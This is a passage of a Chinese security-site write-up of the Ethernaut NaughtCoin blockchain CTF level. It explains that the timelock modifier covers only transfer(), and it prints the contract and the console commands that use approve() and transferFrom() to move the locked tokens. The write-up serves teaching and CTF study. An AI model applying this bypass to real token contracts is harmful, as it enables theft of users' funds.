+由于 NaughtCoin 子合约中并没有实现该接口，我们可以直接调用，从而绕开了 `lockTokens()` ，题目的突破口就在此。  
+需要注意的是，与 `transfer()` 不同，调用 `transferFrom()` 需要 `msg.sender` 获得授权。由于我们本就是合约的
+owner，可以自己给自己授权。授权操作在接口文档里也有
+
+    
+    
+    function approve(address _spender, uint256 _value) returns (bool success)
+    
+
+还有一点，转账的目标账户不能是非法地址，所以需要部署一个第三方 NaughtCoin 合约。注意 import 的时候地址是 github 链接。
+
+    
+    
+    pragma solidity ^0.4.18;
+    
+    import 'https://github.com/OpenZeppelin/zeppelin-solidity/contracts/token/ERC20/StandardToken.sol';
+    
+    contract NaughtCoin is StandardToken {
+    
+        string public constant name = 'NaughtCoin';
+        string public constant symbol = '0x0';
+        uint public constant decimals = 18;
+        uint public timeLock = now + 10 years;
+        uint public INITIAL_SUPPLY = 1000000 * (10 ** decimals);
+        address public player;
+    
+        function NaughtCoin(address _player) public {
+            player = _player;
+            totalSupply_ = INITIAL_SUPPLY;
+            balances[player] = INITIAL_SUPPLY;
+            Transfer(0x0, player, INITIAL_SUPPLY);
+        }
+    
+        function transfer(address _to, uint256 _value) lockTokens public returns(bool) {
+            super.transfer(_to, _value);
+        }
+    
+        // Prevent the initial owner from transferring tokens until the timelock has passed
+        modifier lockTokens() {
+            if (msg.sender == player) {
+                require(now > timeLock);
+                if (now < timeLock) {
+                    _;
+                }
+            } else {
+                _;
+            }
+        } 
+    }
+    
+
+部署完成后复制合约地址，直接在题目界面 console 操作
+
+    
+    
+    contract.approve(player, (await contract.INITIAL_SUPPLY()).toNumber())
+    // 给自己授权
+    
+    contract.transferFrom(player, 3rd_contract_address, (await contract.INITIAL_SUPPLY()).toNumber())
+    // 向刚部署的第三方合约转钱，清空 player 的 balance
+    
+    // You have completed this level !!!
+    
+
+提交之后，可以看一下 Zeppelin 给出的建议
+
+> When using code that’s not your own, it’s a good idea to familiarize
+> yourself with it to get a good understanding of how everything fits
+> together. This can be particularly important when there are multiple levels
+> of imports (your imports have imports) or when you are implementing
+> authorization controls, e.g. when you’re allowing or disallowing people from
+> doing things. In this example, a developer might scan through the code and
+> think that transfer is the only way to move tokens around, low and behold
+> there are other ways of performing the same operation with a different
+> implementation.
+
+![](https://p1.ssl.qhimg.com/dm/1024_486_/t01ed94e515cdf334f2.jpg)
+
+## References
+
+<https://remix.readthedocs.io/en/latest/>  
+<http://solidity.readthedocs.io/en/v0.4.23/>  
+<https://ethereum.github.io/yellowpaper/paper.pdf>  
+<http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review/>  
+<http://rickgray.me/2018/05/26/ethereum-smart-contracts-vulnerabilities-review-part2/>
+
+## 写在最后
+
+如果文章里出现了一些错误，接受大家的批评与指正。  
+也欢迎同样感兴趣的朋友与我交流联系。
+
+<http://mitah.cn/index.php/about-me.html>
+
+审核人：yiwang 编辑：边边
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **MitAh** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/148341](/post/id/148341)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [writeup](/tag/writeup)
+  * [技术分析](/tag/技术分析)
+  * [安全研究](/tag/安全研究)
+  * [区块链CTF](/tag/区块链CTF)
+
+ **+1** __3赞
+
+ __收藏
+
+![](https://p5.ssl.qhimg.com/t01c50af209155d585d.png) MitAh
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
